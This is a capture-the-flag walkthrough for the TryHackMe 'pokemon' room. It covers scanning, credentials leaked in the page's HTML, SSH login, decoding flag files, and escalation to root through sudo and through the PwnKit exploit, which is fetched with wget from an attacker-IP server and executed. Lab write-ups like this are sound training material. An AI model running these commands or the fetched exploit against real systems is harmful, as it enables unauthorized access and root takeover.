---
tags:
  - THM
  - Linux
  - Easy
  - Leakage
  - Sudo
  - PwnKit
---
https://tryhackme.com/room/pokemon/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.242.191 pokemon.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC pokemon.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:14:75:69:1e:a9:59:5f:b2:3a:69:1c:6c:78:5c:27 (RSA)
|   256 23:f5:fb:e7:57:c2:a5:3e:c2:26:29:0e:74:db:37:c2 (ECDSA)
|_  256 f1:9b:b5:8a:b9:29:aa:b6:aa:a2:52:4a:6e:65:95:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Can You Find Them All?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
Found **credentials** inside some HTML tags:
```console
$ curl -s http://pokemon.thm/ | tail

          </p>
        </div>
        <pokemon>:<hack_the_pokemon>
        	<!--(Check console for extra surprise!)-->
      </div>
    </div>
    <div class="validator">
    </div>
  </body>
</html>
```
# Exploitation
Login as **user pokemon** via SSH with **leaked credentials**:
```bash
sshpass -p 'hack_the_pokemon' ssh pokemon@pokemon.thm
```
# Post-Exploitation
## Grass-Type Pokemon
Found a ZIP file containing the **grass Pokemon**:
```console
$ ls /home/pokemon/Desktop
P0kEmOn.zip

$ unzip -d /tmp /home/pokemon/Desktop/P0kEmOn.zip
Archive:  /home/pokemon/Desktop/P0kEmOn.zip
   creating: /tmp/P0kEmOn/
  inflating: /tmp/P0kEmOn/grass-type.txt
```
Decoded the hexadecimal file to get the **grass Pokemon**:
```console
$ cat /tmp/P0kEmOn/grass-type.txt
50 6f 4b 65 4d 6f 4e 7b 42 75 6c 62 61 73 61 75 72 7d

$ xxd -r -p /tmp/P0kEmOn/grass-type.txt
PoKeMoN{Bulbasaur}
```
## Water-Type Pokemon
Based on `grass-type.txt` filename, find the files containing **water** and **fire pokemons**:
```console
$ find / -name *-type.txt 2>/dev/null

/tmp/P0kEmOn/grass-type.txt
/var/www/html/water-type.txt
/etc/why_am_i_here?/fire-type.txt
```
Read the **water Pokemon** file and decrypt it using ROT14:
```console
$ cat /var/www/html/water-type.txt
Ecgudfxq_EcGmP{Ecgudfxq}

$ tr 'A-Za-z' 'O-ZA-No-za-n' < /var/www/html/water-type.txt
Squirtle_SqUaD{Squirtle}
```
## Fire-Type Pokemon
Decode the base64 encoded **fire pokemon** file:
```console
$ cat /etc/why_am_i_here?/fire-type.txt
UDBrM20wbntDaGFybWFuZGVyfQ==

$ base64 -d /etc/why_am_i_here?/fire-type.txt
P0k3m0n{Charmander}
```
## Root Pokemon
Can not run `sudo` as **user pokemon**:
```console
$ sudo -l

Sorry, user pokemon may not run sudo on root.
```
Found **user ash**:
```console
$ grep home /etc/passwd

syslog:x:104:108::/home/syslog:/bin/false
pokemon:x:1000:1000:root,,,:/home/pokemon:/bin/bash
ash:x:1001:1001::/home/ash:
```
Found a file containing **user ash credentials**:
```console
$ cat '/home/pokemon/Videos/Gotta/Catch/Them/ALL!/Could_this_be_what_Im_looking_for?.cplusplus'

# include <iostream>

int main() {
	std::cout << "ash : pikapika"
	return 0;
}
```
**User ash** can run any command using `sudo`:
```console
$ su ash
Password: pikapika

$ sudo -l
Matching Defaults entries for ash on root:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ash may run the following commands on root:
    (ALL : ALL) ALL
```
Become **user root** and get **root's favorite Pokemon**:
```console
$ sudo su

# cat /home/roots-pokemon.txt
Pikachu!
```
## Root (alternative)
Found `/usr/bin/pkexec` with **SUID permissions**:
```console
$ find / -perm -4000 ! -path '/usr/lib/*' 2>/dev/null

/bin/umount
/bin/ping6
/bin/ping
/bin/su
/bin/fusermount
/bin/mount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/pkexec
/usr/sbin/pppd
```
In the attacker's machine, create a Python server with the [PwnKit exploit](https://github.com/ly4k/PwnKit):
```console
$ git clone https://github.com/ly4k/PwnKit

$ cd PwnKit

$ python3 -m http.server 8000
```
Download and execute the **exploit** to become **root**:
```console
$ wget -q http://<ATTACKER-IP>:8000/PwnKit

$ chmod +x PwnKit

$ ./PwnKit

# whoami
root
```